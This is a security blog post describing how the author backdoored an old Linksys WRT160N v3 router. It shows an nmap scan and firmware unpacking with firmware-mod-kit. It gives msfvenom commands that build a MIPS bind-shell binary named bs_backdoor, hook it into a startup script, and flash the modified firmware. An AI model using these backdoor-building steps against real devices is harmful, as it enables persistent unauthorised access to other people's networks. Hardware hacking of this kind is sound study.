---
layout: post
title: 'Modifying Router Firmware - Linksys WRT160N V3'
date: 2022-10-16
categories: exploitation
---
# Preface
There is a point in a man's (or woman's) life where he wakes up and decides that he needs to learn some embedded, or hardware-related cyber.
I had a friend of mine who tell me he had an old router laying around, and asked if I would like to recieve it.
I knew it was time.
![linksys_router](https://user-images.githubusercontent.com/53023744/196064650-137f185d-7708-45a7-8b88-ed1d16f43112.jpg)


# Goal
My goal is simple:
Find an RCE vulnerabillity (post auth), or somehow pop a reverse shell on the router.


# Attack Surface
#### NMAP
I started with enumerating all of the open ports on the device with `nmap`.
This is the scan result:
```
Nmap scan report for 192.168.1.1
Host is up (0.034s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Tomato WAP firmware httpd (Linksys WRT160Nv3 WAP)
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=WRT160Nv3
|_http-server-header: httpd
1780/tcp  open  http    Cisco DPC3828S WiFi cable modem
10080/tcp open  amanda?
Service Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel, cpe:/h:cisco:dpc3828s
```

After briefly researching about each of the running services, I couldn't find anything interesting or helpful.
I decided to digg into the most attractive option - The httpd server, and the web pages it was serving to me.


#### Web Server
This is the main page you get when you try to access the router:
![Main Page](https://user-images.githubusercontent.com/53023744/196054477-ca2a2870-7fa0-43ce-a4c4-577538c0d536.png)

Shortly, this is what I've tried:
* Searching for classic command injections in the ping/traceroute/etc interfaces.
	* The httpd server uses fork(), which behind the scenes calls execvp().
		* How do I know that httpd uses fork()? We'll see later.
	* This means that we can't inject commands, unless we find a way to manipulate the binaries in our favor (basically a LOLBIN).
* Looking into Elon Gliksberg's [article](https://elongl.github.io/exploitation/2021/05/30/pwning-home-router.html) about a similar product - Linksys WRT54G.
	* I've found that in my router's firmware the bug via the language interface was patched.
* The comfortable way: There is a firmware upgrade interface where you can upload your own firmware.
	* If the other methods will fail, I'll go with this one.


# Firmware & Sources
I have to say, finding the right firmware was a cancerous journey.
Linksys had taken down many of the previously available firmwares from their site,
which made searching through the web a little more challenging.
Even though I tried looking into the Wayback Machine - I was stuck with the [sources](https://sourceforge.net/projects/officiallinksysfirmware/files/wrt160n/v3/) only.

At first, you might think to yourself:
"Wow! I can explore everything I want!".
Well, you'll be partially right.
Having the sources _**does**_ help.
But it doesn't always tell you to what architecture the firmware was compiled to,
and it also may not have some patches that the final firmware has.

Luckily enough, I eventually found the right firmware in some [forum](https://forum.dd-wrt.com/phpBB2/viewtopic.php?p=654578).
You can dowload it here if the site is down: [WRT160Nv3_0_03_003.zip](https://github.com/MaximAshin/MaximAshin.github.io/files/9795539/WRT160Nv3_0_03_003.zip)


# Reversing httpd - TODO!!!!!!!!!!!!!!!!!!!!!!!!!
Following the [article](https://elongl.github.io/exploitation/2021/05/30/pwning-home-router.html) Elon wrote, I reversed the httpd binary and searched for dangerous function calls like system(), eval() etc...
Also, I tried to find mentions of nvram_get() (nvram == non volatile ram == stays on the disk) to see if there's any unsanitized user input being used in important places.


# Let's Build a Firmware!
After spending a few hours reversing httpd, I thought to myself that I should try re-building the firmware with my own reverse-shell.
I knew this wasn't any fancy RCE exploit, but a common problem with wacky routers.
Still, I believe this is a handy trick to learn.

First, let's start by downloading the [firmware-mod-kit](https://github.com/rampageX/firmware-mod-kit).
This kit allows us to extract the rootfs from the firmware, add/edit stuff in it, and re-build it.
The kit is **really easy to use**, and you always can reffer to the [docs](https://code.google.com/archive/p/firmware-mod-kit/wikis/Documentation.wiki).

The steps are like so:
```
./extract-firmware.sh ../WRT160Nv3_0_03_003.code1.bin

cd fmk/rootfs/

# Add/Modify stuff here
# Make sure to chmod 777 your-binaries if you upload any
cp ~/Desktop/my_binary_file bin/
chmod 777 bin/my_binary_file

./build-firmware.sh 

# Upload new firmware!
```

Now, before we build our custom binary reverse-shell,
we need to know what architecture we need to compile the binary to.
This can be checked by running `file` on a random binary from the rootfs/bin folder:
```
file rootfs/bin/busybox
Output:
fmk/rootfs/bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

Now let's get to the step where we build our custom reverse-shell, compiled to 32bit mipsel (mipsel == MIPS little-endian).

#### msfvenom
msfvenom is a handy utility that allows us to create (common-use-case) binaries/payloads.
In my case, I searched for payloads that run on mipsel architecture.

```msfvenom -l payloads | grep mipsle```

![image](https://user-images.githubusercontent.com/53023744/196055645-ef0680da-0e41-45f0-8bd2-2f577fc7628f.png)


As we can see, I can create a simple bind shell (listens in a given port and waits for a connection).
We can create the binary itself like so:

```
msfvenom -p linux/mipsle/shell_bind_tcp LPORT=50505 -f elf > bs_backdoor

cp bs_backdoor /fmk/rootfs/bin
chmod 777 /fmk/rootfs/bin/bs_backdoor
```

But wait!
What would make our binary run at all?
Well, bash scripts :)

In many routers, there are a some scripts that run on startup, or on some particular occasion.
We can search for such scripts like so:

```
find fmk/rootfs -name "*.sh*"
Output:
fmk/rootfs/usr/sbin/rotatelog.sh
```

We can modify the script and run our binary from there!
![image](https://user-images.githubusercontent.com/53023744/196065187-621f4102-1e10-439c-a418-1cf30a08ea7f.png)


Also, I wanted to leave a final touch on the router's main page before we re-build the firmware, so I edited index.asp:
![image](https://user-images.githubusercontent.com/53023744/196062658-4e7634b3-6292-4a3c-9a77-87b16b61cfb1.png)


Finally, I ran the `./build-firmware.sh` script and got a new firmware.
Let's upload it :)



# Victory
I went onto the firmware upgrade page, and uploaded the new firmware:

![image](https://user-images.githubusercontent.com/53023744/196064210-275cd403-00f7-4c76-bb00-9d7b8945b533.png)

After a few minutes, I had a screen showing that the upgrade completed successfully!
I waited for the router to restart.

When I saw that the lights on the router stopped blinking, I browsed to the main page.
As we can see, index.asp looked a little different (hehe):

![image](https://user-images.githubusercontent.com/53023744/196062617-0f5bae8f-04d0-4d50-86ed-94cbe260061f.png)


I quickly fired up Metasploit's listener and got a connection:

![image](https://user-images.githubusercontent.com/53023744/196055470-b6343f0c-cf0c-4b13-a3a1-dd64ca53b435.png)


I have a bind shell running on the router!
TBH, It was really fun.


# Additional Sources
[Re-Packing Router's Firmware](https://www.youtube.com/watch?v=M3vQmQ4TSa4&ab_channel=CJHackerz)
